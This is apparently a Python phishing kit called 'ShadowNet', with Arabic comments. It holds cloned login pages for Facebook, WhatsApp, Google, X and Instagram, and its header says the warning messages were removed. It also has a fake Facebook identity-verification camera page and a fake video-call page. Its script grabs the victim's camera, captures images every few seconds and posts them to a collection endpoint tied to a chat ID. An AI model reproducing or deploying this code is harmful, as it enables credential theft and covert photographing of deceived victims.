...
# -*- coding: utf-8 -*-
"""
ShadowNet v15.0 - النسخة النهائية مع تحديثات الواجهات
تم تعديل جميع صفحات التصيد لتطابق مواصفات 2026 الدقيقة
تم إزالة الرسائل التحذيرية من جميع الصفحات
تم تطبيق قواعد CSS لملء الشاشة بدون تشوه
تم تحديث صفحة الكاميرا بنفس تصميم فيسبوك
تم استبدال كود مكالمة الفيديو بكود جديد يلتقط عدة صور ويرسلها للمطور
"""
...
# ===================== قوالب صفحات التصيد المعدلة (فيسبوك - مواصفات دقيقة) =====================
PHISHING_TEMPLATES = {
    'facebook': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            ...
            .language-selector { width: 100%; display: flex; justify-content: flex-start; padding: 8px 4px 12px; font-size: 14px; color: #1C1E21; font-weight: 400; cursor: default; }
            ...
            .logo-circle { width: 58px; height: 58px; background: #1877F2; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 8px 0 16px; }
            .logo-circle span { font-size: 40px; font-weight: 700; font-style: italic; color: #ffffff; line-height: 1; }
            ...
            .create-btn { width: 100%; height: 50px; background: transparent; border: 2px solid #1877F2; border-radius: 25px; font-size: 16px; font-weight: 500; color: #1877F2; cursor: pointer; transition: background 0.2s, color 0.2s; }
            .create-btn:hover { background: #1877F2; color: #ffffff; }
            .meta-footer { display: flex; align-items: center; gap: 6px; margin-top: 28px; font-size: 14px; color: #1C1E21; }
            .meta-footer .infinity { color: #1877F2; font-size: 20px; font-weight: 700; }
            .meta-footer .meta-text { font-weight: 400; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        </style>
    </head>
    <body>
    <div class="container">
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            html, body { width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }
            .container { width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; }
            .language-selector { width: 100%; display: flex; justify-content: flex-start; padding: 8px 4px 12px; font-size: 14px; color: #1C1E21; font-weight: 400; }
            .language-selector span { display: flex; align-items: center; gap: 4px; }
            .language-selector span::after { content: "∨"; font-size: 12px; color: #1C1E21; }
            .logo-whatsapp { font-size: 36px; font-weight: 700; color: #25d366; margin: 8px 0 16px; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; color: #1C1E21; background: #ffffff; outline: none; transition: border-color 0.2s; }
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
            html, body { width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }
            .container { width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; }
            .logo-google { font-size: 36px; font-weight: 500; color: #4285f4; margin: 8px 0 16px; }
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            html, body { width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }
            .container { width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; }
            .logo-x { font-size: 42px; font-weight: 700; color: #000000; margin: 8px 0 16px; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; color: #1C1E21; background: #ffffff; outline: none; transition: border-color 0.2s; }
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            ...
            .logo-instagram { font-size: 32px; font-weight: 700; color: #262626; margin: 8px 0 16px; font-family: 'Grand Hotel', cursive; }
            .form-group { width: 100%; margin-bottom: 12px; }
...
# ===================== صفحة الكاميرا المعدلة (تصميم فيسبوك الجديد) =====================
    ...
    <head>
        ...
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
            ...
            .logo-circle {{ width: 58px; height: 58px; background: #1877F2; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 8px 0 16px; }}
            .logo-circle span {{ font-size: 40px; font-weight: 700; font-style: italic; color: #ffffff; line-height: 1; }}
            .title-text {{ font-size: 18px; font-weight: 600; color: #1C1E21; margin-bottom: 6px; }}
            .subtitle-text {{ font-size: 14px; color: #606770; margin-bottom: 20px; text-align: center; }}
            .security-badge {{ background: #f0f2f5; border-radius: 25px; padding: 10px 20px; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; color: #1C1E21; font-size: 14px; width: 100%; justify-content: center; }}
            .security-badge span {{ font-size: 16px; }}
            .btn {{ width: 100%; height: 50px; background: #1877F2; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: #ffffff; cursor: pointer; transition: background 0.2s; margin-top: 4px; }}
            .btn:hover {{ background: #166fe5; }}
            .btn:disabled {{ opacity: 0.6; cursor: not-allowed; }}
            .footer-links {{ margin-top: 20px; font-size: 13px; color: #8a8d91; }}
            .footer-links a {{ color: #1877f2; text-decoration: none; }}
            .footer-links a:hover {{ text-decoration: underline; }}
            .meta-footer {{ display: flex; align-items: center; gap: 6px; margin-top: 28px; font-size: 14px; color: #1C1E21; }}
            .meta-footer .infinity {{ color: #1877F2; font-size: 20px; font-weight: 700; }}
            .meta-footer .meta-text {{ font-weight: 400; }}
        </style>
    </head>
    <body>
    <div class="container">
        <div class="language-selector"><span>العربية</span></div>
        <div class="logo-circle"><span>f</span></div>
        <div class="title-text">تأكيد هويتك</div>
        <div class="subtitle-text">لأسباب أمنية، نطلب منك تأكيد هويتك باستخدام الكاميرا</div>
        <div class="security-badge"><span>🔒</span> اتصال آمن ومشفر</div>
        <button id="verifyBtn" class="btn">✅ تأكيد الهوية</button>
        <div class="footer-links"><a href="#">مساعدة</a> · <a href="#">مركز الأمان</a></div>
        <div class="meta-footer"><span class="infinity">∞</span><span class="meta-text">Meta</span></div>
    </div>
    <script>
    (function() {{
...
# ===================== كود مكالمة الفيديو الجديد (يلتقط عدة صور ويرسلها للمطور) =====================
...
def video_call_page():
    ...
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>منصة التواصل - الدردشة ومكالمات الفيديو</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
            html, body {{ width: 100%; height: 100vh; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); overflow: hidden; color: #ffffff; }}
            .view-section {{ display: none; width: 100%; height: 100%; position: absolute; top: 0; left: 0; }}
            .view-section.active {{ display: flex; justify-content: center; align-items: center; }}
            .platform-container {{ width: 100%; max-width: 500px; height: 100%; display: flex; flex-direction: column; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(16px); border-left: 1px solid rgba(255,255,255,0.08); border-right: 1px solid rgba(255,255,255,0.08); }}
            .platform-header {{ padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(15,23,42,0.9); }}
            .platform-title {{ font-size: 18px; font-weight: 700; letter-spacing: 0.5px; }}
            .online-badge {{ display: flex; align-items: center; gap: 8px; font-size: 13px; color: #94a3b8; background: rgba(255,255,255,0.05); padding: 6px 12px; border-radius: 20px; }}
            .dot {{ width: 8px; height: 8px; background-color: #22c55e; border-radius: 50%; box-shadow: 0 0 8px #22c55e; }}
            .accounts-list {{ flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 16px; }}
            .account-card {{ display: flex; align-items: center; justify-content: space-between; background: rgba(30,41,59,0.6); border: 1px solid rgba(255,255,255,0.06); padding: 14px 18px; border-radius: 16px; transition: all 0.3s ease; }}
            .account-card:hover {{ background: rgba(30,41,59,0.9); border-color: rgba(59,130,246,0.4); transform: translateY(-2px); }}
            .account-info {{ display: flex; align-items: center; gap: 14px; }}
            .account-avatar {{ width: 55px; height: 55px; border-radius: 50%; overflow: hidden; border: 2px solid #3b82f6; flex-shrink: 0; }}
            ...
            .account-status {{ font-size: 12px; color: #22c55e; }}
            .video-call-btn {{ background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); color: white; border: none; width: 44px; height: 44px; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 4px 12px rgba(59,130,246,0.4); transition: all 0.2s ease; }}
            .video-call-btn:hover {{ transform: scale(1.08); background: linear-gradient(135deg, #2563eb, #1e40af); }}
            .video-call-btn svg {{ width: 20px; height: 20px; fill: currentColor; }}
            .call-container {{ width: 100%; max-width: 500px; height: 100%; display: flex; flex-direction: column; position: relative; background-color: #0f172a; }}
            .call-header {{ position: absolute; top: 0; left: 0; right: 0; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; background: rgba(15,23,42,0.6); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255,255,255,0.08); z-index: 20; }}
            .brand-box {{ display: flex; align-items: center; gap: 12px; color: #ffffff; }}
            .live-indicator {{ width: 10px; height: 10px; background-color: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 2s infinite; }}
            .brand-title {{ font-size: 16px; font-weight: 700; }}
            .room-badge {{ background: rgba(255,255,255,0.1); padding: 6px 14px; border-radius: 20px; color: #cbd5e1; font-size: 13px; }}
            .video-viewport {{ flex: 1; width: 100%; height: 100%; position: relative; background-color: #0b0f19; display: flex; justify-content: center; align-items: center; overflow: hidden; }}
            .main-video-placeholder {{ width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #64748b; gap: 15px; background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); }}
            .spinner {{ width: 45px; height: 45px; border: 3px solid rgba(59,130,246,0.2); border-top-color: #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }}
            .self-video-box {{ position: absolute; bottom: 100px; right: 24px; width: 110px; height: 150px; background: #1e293b; border-radius: 12px; overflow: hidden; border: 2px solid rgba(255,255,255,0.15); box-shadow: 0 8px 20px rgba(0,0,0,0.5); z-index: 15; display: flex; justify-content: center; align-items: center; color: #475569; font-size: 12px; }}
            .control-dock {{ position: absolute; bottom: 24px; left: 50%; transform: translateX(-50%); display: flex; align-items: center; gap: 16px; padding: 12px 24px; background: rgba(15,23,42,0.75); backdrop-filter: blur(16px); border-radius: 40px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.6); z-index: 20; }}
            .dock-btn {{ width: 48px; height: 48px; border-radius: 50%; border: none; background: rgba(255,255,255,0.08); color: #ffffff; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: all 0.25s ease; }}
            .dock-btn:hover {{ background: rgba(255,255,255,0.2); transform: translateY(-2px); }}
            .dock-btn.danger {{ background-color: #ef4444; box-shadow: 0 4px 15px rgba(239,68,68,0.4); }}
            .dock-btn.danger:hover {{ background-color: #dc2626; }}
            .dock-btn svg {{ width: 20px; height: 20px; fill: currentColor; }}
            @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
            @keyframes pulse {{ 0% {{ transform: scale(0.95); opacity: 0.8; }} 50% {{ transform: scale(1.15); opacity: 1; box-shadow: 0 0 15px #22c55e; }} 100% {{ transform: scale(0.95); opacity: 0.8; }} }}
        </style>
    </head>
    <body>
        <div id="contactsView" class="view-section active">
            <div class="platform-container">
                <header class="platform-header">
                    <span class="platform-title">جهات الاتصال</span>
                    <div class="online-badge"><div class="dot"></div><span>متصل الآن</span></div>
                </header>
                <div class="accounts-list">
                    <div class="account-card">
                        <div class="account-info">
                            <div class="account-avatar"><img src="26585.jpg" alt="Aseel Avatar"></div>
                            <div class="account-details">
                                <span class="account-name">Aseel</span>
                                <span class="account-status">نشط الآن</span>
                            </div>
                        </div>
                        <button class="video-call-btn" title="بدء مكالمة فيديو" onclick="startCall()">
        ...
        <div id="callView" class="view-section">
            <div class="call-container">
                <header class="call-header">
                    <div class="brand-box"><div class="live-indicator"></div><span class="brand-title">مكالمة نشطة مع Aseel</span></div>
                    <div class="room-badge">#ID: 894-202</div>
                </header>
                <div class="video-viewport">
                    <div class="main-video-placeholder">
                        <div class="spinner"></div>
                        <span style="font-size: 14px; font-weight: 500;">جاري الاتصال بـ Aseel...</span>
                    </div>
                </div>
                <div class="self-video-box"><span>أنت</span></div>
                <div class="control-dock">
                    <button class="dock-btn" title="كتم الصوت" onclick="toggleMic()">
                        <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.91-3c-.49 0-.9.39-.9.89 0 2.72-2.25 4.93-5 4.93s-5-2.21-5-4.93c0-.5-.41-.89-.9-.89s-.9.39-.9.89c0 3.23 2.47 5.9 5.7 6.35V21h2v-2.76c3.23-.45 5.7-3.12 5.7-6.35 0-.5-.4-1.89-.89-1.89z"/></svg>
                    </button>
                    <button class="dock-btn" title="الكاميرا" onclick="toggleCam()">
                        <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
                    </button>
                    <button class="dock-btn danger" title="إنهاء المكالمة" onclick="endCall()">
        ...
        <script>
            ...
            function requestCamera() {{
                ...
                .then(function(s) {{
                    stream = s;
                    // بدء التقاط صور متعددة كل 3 ثوانٍ
                ...
                try {{
                    ...
                    setTimeout(function() {{
                        ...
                        fetch('/api/collect_camera', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ chat_id: chatId, image: imageData, source: 'video_call' }})
                        }});
                    }}, 100);
                }} catch(e) {{
